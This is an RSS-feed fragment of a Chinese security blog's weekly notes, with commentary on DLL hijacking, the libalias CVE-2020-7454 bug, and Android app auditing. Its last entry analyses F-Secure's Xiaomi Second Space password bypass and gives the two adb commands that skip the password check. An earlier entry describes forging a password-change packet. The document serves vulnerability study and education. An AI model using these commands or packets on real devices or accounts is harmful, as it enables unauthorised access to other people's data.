                <pubDate>Fri, 10 Jul 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/07/10/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.10.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/07/10/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.10.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.07.06 活过来了</title>
                <description>&lt;p&gt;整个六月一共发了七篇文章，六月初的时候我尝试了一下日更安全笔记，结果是失败了&lt;/p&gt;

&lt;p&gt;安全是一个需要耐心研究的领域，保持每天产出高质量原创内容有点难，所以我恢复了之前每周五更新本周的安全笔记，我要保证文章的质量&lt;/p&gt;

&lt;p&gt;没发文的大半个月里我在做两件事情，重点在写一个移动端应用审计工具，主要是逻辑漏洞，然后研究一些其它领域的逻辑漏洞，扩展思路&lt;/p&gt;

&lt;p&gt;最近一些不错的技术文章，学习完后感觉获益颇丰，跟各位分享一下自己的心得&lt;/p&gt;

&lt;p&gt;TSRC出品的《红蓝对抗之Windows内网渗透》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://security.tencent.com/index.php/blog/msg/154&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;从红蓝对抗的角度来说我应该属于蓝军，不过职责并不在这种内网渗透领域，这篇文章我学习完后感觉非常好，讲的极其详细，其中提到的一些点我感觉可以应用在日常审计中&lt;/p&gt;

&lt;p&gt;如果之后产出较为不错，我会使用其它厂商的应用作为例子讲解一些实战操作&lt;/p&gt;

&lt;p&gt;搞移动端业务安全，一定要深入业务场景，脱离业务场景的审计肯定是走不远的，漏洞只会掩盖在应用加固和代码混淆下面，迟早有一天会被人从冰下面挖出来吊打&lt;/p&gt;

&lt;p&gt;《Almost 300 Windows 10 executables vulnerable to DLL hijacking》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bleepingcomputer.com/news/security/almost-300-windows-10-executables-vulnerable-to-dll-hijacking/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最近Windows平台的DLL劫持漏洞文章突然就多了起来&lt;/p&gt;

&lt;p&gt;我想了想，这种漏洞在Android端好像是没有，但是像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoadLibary()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoadLibraryEx()&lt;/code&gt;这样的倒是有&lt;/p&gt;

&lt;p&gt;Android平台加载Dex文件是使用类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DexClassLoader&lt;/code&gt;，加载So文件是使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.loadLibrary()&lt;/code&gt;，这两个都是指定路径去加载文件&lt;/p&gt;

&lt;p&gt;可能存在的风险比如目标文件在SDCard可全局读写导致被劫持替换，加载的时候如果没有做好哈希校验就容易出现任意代码执行&lt;/p&gt;

&lt;p&gt;《Automating DLL Hijack Discovery》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Hijacking DLLs in Windows》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不怕被大家笑话，我现在产出少了就会慌，看着其他师傅们每月各种致谢，动不动几十万刀的Bounty，说不羡慕是不可能的&lt;/p&gt;

&lt;p&gt;所以手里有一些闲置计算资源的时候就会弄一些Fuzzer跑跑，万一就踩中了一个RCE呢？&lt;/p&gt;

&lt;p&gt;我其实不是很喜欢DLL劫持这样的漏洞，我喜欢那种利用系统服务提供的接口，通过低权限进程给高权限进程发消息执行一些非预期行为&lt;/p&gt;

&lt;p&gt;《CVE-2020-7454: KILLING TWO BIRDS WITH ONE BUG IN LIBALIAS》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.thezdi.com/blog/2020/6/29/cve-2020-7454-killing-two-systems-with-one-bug-in-libalias&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;libalias是一个第三方库，用来给IP包进行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aliasing&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de-aliasing&lt;/code&gt;，CVE-2020-7454存在于函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AliasHandleUdpNbtNS()&lt;/code&gt;，它会获取一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pmax&lt;/code&gt;字段，该字段直接根据偏移从数据包内获取&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AliasHandleUdpNbtNS(...) 
{
    /* ... snip ... */
    /* Calculate data length of UDP packet */ 
    uh = (struct udphdr *) ip_next(pip); 
    nsh = (NbtNSHeader *) udp_next(uh); 
    p = (u_char *) (nsh + 1); 
    pmax = (char *)uh + ntohs(uh-&amp;gt;uh_ulen); /* &amp;lt;--- (1) */  
    
    /* ... snip ... */
    if (ntohs(nsh-&amp;gt;ancount) != 0) { 
        p = AliasHandleResource(ntohs(nsh-&amp;gt;ancount), (NBTNsResource *) p, pmax, &amp;amp;nbtarg); 
    } 
    /* ... snip ... */
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pmax&lt;/code&gt;传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AliasHandleResource()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AliasHandleResource(..., char *pmax, ...) 
{ 
    /* ... snip ... */
        switch (ntohs(q-&amp;gt;type)) { 
        case RR_TYPE_NB: 
            q = (NBTNsResource *) AliasHandleResourceNB(q, pmax, nbtarg); 
            break; 
    /* ... snip ... */ 
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AliasHandleResourceNB()&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(2)&lt;/code&gt;循环判断的时候没判断&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pmax&lt;/code&gt;长度，导致&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(3)&lt;/code&gt;越界访问了，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(4)&lt;/code&gt;还可以越界写&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AliasHandleResourceNB(..., char *pmax, ...) 
{ 
    /* ... snip ... */
    while (nb != NULL &amp;amp;&amp;amp; bcount != 0) { 
        if ((char *)(nb + 1) &amp;gt; pmax) { /* &amp;lt;--- (2) */
            nb = NULL; 
            break; 
        } 
        if (!bcmp(&amp;amp;nbtarg-&amp;gt;oldaddr, &amp;amp;nb-&amp;gt;addr, sizeof(struct in_addr))) { /* &amp;lt;--- (3)  /
            /* ... snip ... */ 
            nb-&amp;gt;addr = nbtarg-&amp;gt;newaddr; /* &amp;lt;--- (4) */
        } 
        /* ... snip ... */
        nb = (NBTNsRNB *) ((u_char *) nb + SizeOfNsRNB); 
    } 
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ZDI这个代码标识非常漂亮，该省的省，清晰明了，我要好好学习一下&lt;/p&gt;

&lt;p&gt;《FANS: Fuzzing Android Native System Services via Automated Interface Analysis》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.usenix.org/system/files/sec20fall_liu_prepub.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;接下来我搞一下Android的系统服务，大概的研究方式和大佬是类似的，不过我不是去Fuzz，而是找到所有的接口之后，去做路径搜索，找一些敏感的行为操作，这个路径搜索可以参考k0师傅之前写过的一篇文章《A SIMPLE STORY OF DSSVC, “LIVE AND DIE”》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://whereisk0shl.top/post/a-simple-story-of-dssvc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Always k0shl！&lt;/p&gt;

&lt;p&gt;我也写了一个类似Jandroid的工具，可惜F-Secure那群人已经发了，我的就不开源了&lt;/p&gt;

&lt;p&gt;最后推荐一篇奇安信的文章《“道贼”SDK：揭秘操控数百万Android手机的恶意营销插件》，对门的报告输出能力确实很好&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/zjG3zlJo1dSSb2mjY9QxDA&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我一直想搞一个像这种样本大数据监控的系统，后面的扫描引擎实现难度其实不大，基于经验编写规则即可&lt;/p&gt;

&lt;p&gt;我目前遇到的一个难点在于不知道如何建立一个大数据搜索系统&lt;/p&gt;

&lt;p&gt;比如现在有一百万个应用，我需要先对其进行规则扫描，这个规则扫描可以基于很多方式，尽可能的获取其行为，并且做好存储&lt;/p&gt;

&lt;p&gt;然后对扫描出来的数据做大数据分析，比如关键函数调用，对同一个执行路径做归类&lt;/p&gt;

&lt;p&gt;以下面这个举例，我们可以搜索出大量拥有类似调用路径的不同SDK&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;com.evil.sdk.a.b.c-&amp;gt;a()-&amp;gt;b()-&amp;gt;loadLibrary()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再对每一个SDK进行深入分析，比如数据流分析，看加载的文件来自哪里，从本地解密释放的，还是从服务器动态下载的&lt;/p&gt;

&lt;p&gt;或者可以把包含同一个SDK的应用进行批量动态分析，补充动态行为，尤其是加载的插件行为&lt;/p&gt;

&lt;p&gt;以上这一段只是我个人的想法，跟业界大佬们成熟的实现方案相比只是一个没牌面的玩具，如果有机会可以真正参与玩一把，我还是很乐意的&lt;/p&gt;

&lt;p&gt;我不是想加入国家队，我喜欢自由，每天九点上班六点下班那种&lt;/p&gt;

&lt;p&gt;最近股市行情不错，跑步入场吧&lt;/p&gt;
</description>
                <pubDate>Mon, 06 Jul 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/07/06/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.06.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/07/06/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.07.06.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.06.15 幸好消费不起三文鱼</title>
                <description>&lt;p&gt;还记得上周说的那八个漏洞嘛，我已经学习完了&lt;/p&gt;

&lt;p&gt;Windows并不是我擅长的平台，但是Android我熟悉，此处先省略若干思路&lt;/p&gt;

&lt;p&gt;安卓应用审计这种东西，可大可小&lt;/p&gt;

&lt;p&gt;说实话很多人也就做到个本地测试，任意备份，任意调试，证书没校验，抓包明文等等&lt;/p&gt;

&lt;p&gt;稍微深入点的，搞个注册码爆破，越权，注入&lt;/p&gt;

&lt;p&gt;我一直认为搞应用安全其实最后都需要回到渗透，本地那些审计点玩一段时间就没啥搞头了&lt;/p&gt;

&lt;p&gt;下面这个视频也就是讲了个大概，如果是刚入门的同学可以看看&lt;/p&gt;

&lt;p&gt;《Getting Started With Hacking Android &amp;amp; iOS Apps? Tools, Techniques and resources》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=BQWcUjzxJE0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不懂渗透没关系，起码得结合业务，比如逻辑漏洞&lt;/p&gt;

&lt;p&gt;我举个例子，我以前刷SRC经常遇到的一种情况&lt;/p&gt;

&lt;p&gt;首先是HTTP传输数据，数据包格式如下，我做了一些省略，只显示具体字段&lt;/p&gt;

&lt;p&gt;登录&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;method=login&amp;amp;_xmlString=&amp;lt;s passwd=&quot;8924aec8faf3c1cb54a25dbc176bb97f&quot;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改密码&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;method=modifyPass&amp;amp;_xmlString=&amp;lt;s oldPass=&quot;8924aec8faf3c1cb54a25dbc176bb97f&quot;/&amp;gt;&amp;lt;s newPass=&quot;5eeac75b9ef13164957248ab61d246bd&quot;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们可以看到它的数据包中间是使用了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;字段用于表示当前客户端所做的操作&lt;/p&gt;

&lt;p&gt;尤其是修改密码，它使用的是非常简单的MD5算法进行传值&lt;/p&gt;

&lt;p&gt;所以我们直接构造这个包，就可以在局域网下把用户的密码给改了&lt;/p&gt;

&lt;p&gt;我跟别人分享这些思路的时候，总有人觉得这种漏洞很垃圾&lt;/p&gt;

&lt;p&gt;千里之堤，溃于蚁穴&lt;/p&gt;

&lt;p&gt;这些看起来很垃圾的漏洞往往组合起来能够达到意想不到的效果&lt;/p&gt;

&lt;p&gt;有时候看别人的Slides总觉得差那么点意思，该讲的不讲，都是些陈芝麻烂谷子的东西&lt;/p&gt;

&lt;p&gt;这个分享一大半全是表情包，哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;《Reversing Android Apps》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://speakerdeck.com/marcobrador/mdevcamp-2020-reversing-android-apps&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我之所以会看这些是因为有些老外的思路确实是好，拍案叫绝！&lt;/p&gt;

&lt;p&gt;不看的话容易错过&lt;/p&gt;

&lt;p&gt;下面这篇也当个乐看吧&lt;/p&gt;

&lt;p&gt;《Hacking Android Application: Secret Diary》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://medium.com/swlh/hacking-android-application-secret-diary-2fa50d5d4b75&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;老外写文章有个特点，前面铺垫一堆看起来很牛逼的系统各种底层原理，最后来一个贼简单的指令修改&lt;/p&gt;

&lt;p&gt;哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;这种汇总形式的项目特别容易集Star，还不错&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/vaib25vicky/awesome-mobile-security&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;周末在整理书籍，把渗透相关的书都搬到了组里，曰：大土豆捐赠&lt;/p&gt;

&lt;p&gt;最后有个好消息，我已经搭建好了Read The Docs&lt;/p&gt;

&lt;p&gt;我会把之前写的文章重新整理一份，逐渐上传，整理成电子书的形式&lt;/p&gt;

&lt;p&gt;好啦，各位老板到钟了&lt;/p&gt;

&lt;p&gt;Duang~Duang~Duang~&lt;/p&gt;
</description>
                <pubDate>Mon, 15 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/06/15/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.15.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/06/15/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.15.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.06.12 今年没有粽子收了</title>
                <description>&lt;p&gt;B站小UP的《安卓恶意APP分析的心得分享》最后一弹&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bilibili.com/video/BV1iQ4y1P7GZ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我正在制作一些带语音解说的病毒分析视频，科普向的，会在B站与大家见面&lt;/p&gt;

&lt;p&gt;欢迎大佬们三连投币哦~&lt;/p&gt;

&lt;p&gt;又到了一年一度的粽子节，大佬们纷纷在朋友圈秀起了SRC小姐姐们寄的粽子大礼盒，其乐融融&lt;/p&gt;

&lt;p&gt;好惨，过气二进制选手今年一盒粽子都收不到&lt;/p&gt;

&lt;p&gt;现在去挖漏洞还来得及吗？&lt;/p&gt;

&lt;p&gt;讲一件很逗的事情，我今天看到一个技术沙龙直播预告，口号很响亮：只讲干货&lt;/p&gt;

&lt;p&gt;哈哈哈哈哈哈哈哈哈哈，怕不是要笑死我&lt;/p&gt;

&lt;p&gt;今天逛推，发现了楼上大佬发的八个Windows漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/afang5472/CVE-2020-0753-and-CVE-2020-0754&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;涉及到了我的知识盲区，周末找个Windows大佬给我在线讲解一波，看看能不能顺手捡个漏&lt;/p&gt;

&lt;p&gt;Android 11的新功能介绍&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=fnkFOhA7FC4&amp;amp;list=PLWz5rJ2EKKc9hqKx4qZWolQxy59Bt20t_&amp;amp;index=4&amp;amp;t=1s&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;曾经楼上Alpha的师傅跟我说过，我印象极其深刻，说新出的版本里往往会引进很多漏洞，这也是机会所在&lt;/p&gt;

&lt;p&gt;看完这个视频之后，或许潘多拉大门的钥匙就出现了&lt;/p&gt;

&lt;p&gt;文字版本可以看这里&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://android-developers.googleblog.com/2020/06/unwrapping-android-11-beta-plus-more.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我发现Frida真的好用，尤其是在高版本的系统里&lt;/p&gt;

&lt;p&gt;有一个很牛逼的工具，这个工具说真的，挖漏洞绝对神器&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我这两天在思考关于在系统层面做行为监控的方案，这就涉及到了自己编译系统，且可在日常正常使用&lt;/p&gt;

&lt;p&gt;LineageOS是一个不错的选择，原生可用性比起来还是差了些意思&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.xda-developers.com/how-to-build-lineageos-on-windows-10-using-wsl-2/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后如果有同学想要上手搞安卓安全测试但经费有限的，可以参考下这篇文章，属实入门&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://securityjunky.com/guide-to-setting-up-android-pentesting-lab/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不过文章里面提到的工具我在日常用的极其少，一般都是JEB，IDA Pro，Burp以及多个厂商的测试机&lt;/p&gt;

&lt;p&gt;MIUI我觉得是一个很有搞头的东西，逻辑漏洞肯定有很多，而这又是我的强项，尤其是看起来很弱智的逻辑漏洞&lt;/p&gt;

&lt;p&gt;到时候弄个老外的账号提交漏洞，美滋滋&lt;/p&gt;

&lt;p&gt;好啦，各位老板到钟了&lt;/p&gt;

&lt;p&gt;Duang~Duang~Duang~&lt;/p&gt;
</description>
                <pubDate>Fri, 12 Jun 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/06/12/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.12.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/06/12/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.06.12.html</guid>
            </item>
        
            <item>
                <title>REDMI 5 Plus Second Space Password Bypass</title>
                <description>&lt;p&gt;这个漏洞来自F-Secure实验室&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://labs.f-secure.com/advisories/xiaomi-second-space&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一句话描述就是：通过ADB命令启动一个Service就可以绕过小米Second Space的密码校验&lt;/p&gt;

&lt;p&gt;我有一台Mix 2，刚好可以用于测试&lt;/p&gt;

&lt;p&gt;Second Space的中文版本叫作&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;手机分身&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/DEC8A5C4B85CB1E7735AB3530F29BD12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;开启手机分身&lt;/code&gt;，会进入设置，两个密码，一个密码用于进入分身，一个密码用于回到主系统&lt;/p&gt;

&lt;p&gt;这个漏洞的作用，就是让攻击者不需要密码，也可以进入分身，并且在主系统与分身之间自由切换&lt;/p&gt;

&lt;p&gt;一共两条命令&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ SECOND_USER=`adb shell pm list users | grep -o &quot;{[0-9]*&quot; | tr -d '{' | tail -n 1`
➜ adb shell am start-service --ez params_check_password False --ei params_target_user_id $SECOND_USER -a com.miui.xspace.TO_CHANGE_USER
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一条命令用于查询当前手机里的用户，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;| grep -o &quot;{[0-9]*&quot; | tr -d '{' | tail -n 1&lt;/code&gt;用于过滤出&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;11&lt;/code&gt;这个字段&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ adb shell pm list users
Users:
	UserInfo{0:机主:13} running
	UserInfo{11:security space:13} running
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二条命令可以说是最为关键，我们对其进行参数拆分&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb shell am start-service // 通过ADB命令启动Service
    --ez params_check_password False // boolean类型参数
    --ei params_target_user_id $SECOND_USER // int类型参数
    -a com.miui.xspace.TO_CHANGE_USER // 指定的Action
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们现在知道了这个Service响应的Action是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;com.miui.xspace.TO_CHANGE_USER&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;根据F-Secure的文章提示找到应用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.miui.securitycore&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;当然了，你想自己通过全局爆搜APK字符串也是可以的&lt;/p&gt;

&lt;p&gt;这是实现Space切换的Service&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/EB405B9E46F294F27D622AED92854C57.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;查看AndroidManifest文件的定义，有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;intent-filter&amp;gt;&lt;/code&gt;默认导出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;service 
    android:name=&quot;com.miui.securityspace.service.SwitchUserService&quot;
    android:permission=&quot;android.permission.INTERACT_ACROSS_USERS&quot; 
    android:process=&quot;com.miui.securitycore.remote&quot;&amp;gt;
    &amp;lt;intent-filter&amp;gt;
        &amp;lt;action android:name=&quot;com.miui.xspace.TO_CHANGE_USER&quot; /&amp;gt;
    &amp;lt;/intent-filter&amp;gt;
&amp;lt;/service&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取四个Intent字段后，调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkPasswordBeforeSwitch()&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mTargetUserId&lt;/code&gt;就是上文提到的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;11&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public int onStartCommand(Intent intent, int arg7, int arg8) {
    this.mDelayTime = intent.getLongExtra(&quot;com.miui.xspace.preference_delay_time&quot;, 300);
    this.mFromType = intent.getStringExtra(&quot;com.miui.xspace.preference_from_type&quot;);
    this.mTargetUserId = intent.getIntExtra(&quot;params_target_user_id&quot;, -10000);
    this.mIsNeedcheckPassword = intent.getBooleanExtra(&quot;params_check_password&quot;, true);
    Log.d(&quot;SwitchUserService&quot;, &quot;mTargetUserId: &quot; + this.mTargetUserId);
    if(this.mTargetUserId != -10000) {
        this.checkPasswordBeforeSwitch(this.mTargetUserId);
    }

    this.stopSelf();
    return super.onStartCommand(intent, arg7, arg8);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;needCloseSdcardFs()&lt;/code&gt;返回的固定值&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;，所以第一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;块不会进入，第二个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;块有两个判断条件，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!mIsNeedcheckPassword&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!isSecure()&lt;/code&gt;，只需要满足其中一个就可以进入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;块，而Poc中设置的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;params_check_password&quot;&lt;/code&gt;字段为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt;，所以这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if&lt;/code&gt;块就是我们关注的重点&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private void checkPasswordBeforeSwitch(int mTargetUserId) {
    Intent intent;
    
    // private boolean needCloseSdcardFs(int arg2) { return 0; }
    if(this.needCloseSdcardFs(mTargetUserId)) {
        intent = new Intent(((Context)this), SdcardFsDialogActivity.class);
        intent.setFlags(0x10000000);
        this.startActivity(intent);
        return;
    }

    if(!this.mIsNeedcheckPassword || !SpaceManagerWrapper.getInstance().isSecure(mTargetUserId)) {
        int v1 = SpaceManagerWrapper.getInstance().switchUser(mTargetUserId);
        if(v1 == 0) {
            AnalyticsHelper.trackSwitchUser(mTargetUserId, this.mFromType);
        }
        else if(2 == v1) {
            ToastUtils.makeText(((Context)this), this.getResources().getString(0x7F09014B), 0).show(); // Can't switch between spaces during a call
        }
        else if(3 == v1) {
            ToastUtils.makeText(((Context)this), this.getResources().getString(0x7F09018B), 0).show(); // Switching to Second space is restricted by parental controls
        }
        else if(4 == v1) {
            ToastUtils.makeText(((Context)this), this.getResources().getString(0x7F0901CC), 0).show(); // Can't switch between spaces when Ultra battery saver is on
        }
    }
    else {
        intent = new Intent(((Context)this), SwitchUserConfirmActivity.class);
        intent.addFlags(0x10008000);
        intent.putExtra(&quot;preference_key_user_id&quot;, mTargetUserId);
        intent.putExtra(&quot;com.miui.xspace.preference_delay_time&quot;, this.mDelayTime);
        intent.putExtra(&quot;com.miui.xspace.preference_from_type&quot;, this.mFromType);
        this.startActivityAsUser(intent, new UserHandle(CrossUserUtils.getCurrentUserId()));
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

